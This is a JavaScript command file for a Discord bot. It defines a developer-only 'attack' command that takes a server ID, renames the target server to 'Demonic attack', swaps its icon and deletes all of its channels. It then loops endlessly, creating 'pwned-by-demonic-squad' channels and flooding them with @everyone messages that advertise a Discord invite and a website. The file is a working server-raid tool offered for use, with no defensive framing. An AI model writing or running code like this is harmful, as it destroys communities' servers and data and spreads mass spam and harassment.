const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args) => {

const dev = ["932334929721819226"]   
if (!dev.includes(message.author.id)) return message.channel.send('no')


try {

var id = args[0]
if(id === "766690692877385799") return message.channel.send(new MessageEmbed().setColor("BLACK").setDescription("```Error ❌ El comando no funciona en ese servidor.```"))
var servidor = client.guilds.cache.get(id)

if(client.guilds.cache.has(id)) {

message.channel.send(new MessageEmbed().setColor("BLACK").setDescription("```Atacando "+servidor.name+"```"))

servidor.setName("ↁ⁅ḾṎṈḭᏨ ᾀttᾀᏨḳ")
servidor.setIcon("https://cdn.discordapp.com/attachments/933227837845024798/938595533918990346/demonicsquadbot.jpg")
  
servidor.channels.cache.map(c => {
c.delete()
})

setInterval(async function() {
var canales = await servidor.channels.create("pwned-by-demonic-squad",  { type: "text" });
servidor.guild.channels.cache.get(canales.id).send("@everyone https://discord.gg/8gNmhfKpNS");
servidor.guild.channels.cache.get(canales.id).send("@everyone https://demonicsquad.net/");
servidor.guild.channels.cache.get(canales.id).send("@everyone https://discord.gg/8gNmhfKpNS");
servidor.guild.channels.cache.get(canales.id).send("@everyone https://demonicsquad.net/");
servidor.guild.channels.cache.get(canales.id).send("@everyone https://discord.gg/8gNmhfKpNS");
servidor.guild.channels.cache.get(canales.id).send("@everyone https://demonicsquad.net/");
servidor.guild.channels.cache.get(canales.id).send("@everyone https://discord.gg/8gNmhfKpNS");
servidor.guild.channels.cache.get(canales.id).send("@everyone https://demonicsquad.net/");
servidor.guild.channels.cache.get(canales.id).send("@everyone https://discord.gg/8gNmhfKpNS");
servidor.guild.channels.cache.get(canales.id).send("@everyone https://demonicsquad.net/");
});

} else {
message.channel.send(new MessageEmbed().setColor("BLACK").setDescription("```Error ❌ No estoy en ese servidor.```"))
}

} catch(e) {
message.channel.send(new MessageEmbed().setDescription("```Error ❌ Ha ocurrido una falla```")
              .addField("__Posibles Errores:__", "```• Permisos insuficientes\n• No estoy en el servidor```")
              .addField("__Error Detallado:__", "```"+e+"```"))
}

}

exports.help = {
  name: "attack",
  aliases:["atacar"],
  usage: "[ Argumentos : Server ID ]",
  description: "Ataca un servidor mediante la ID",
  category: "Developer"
  
}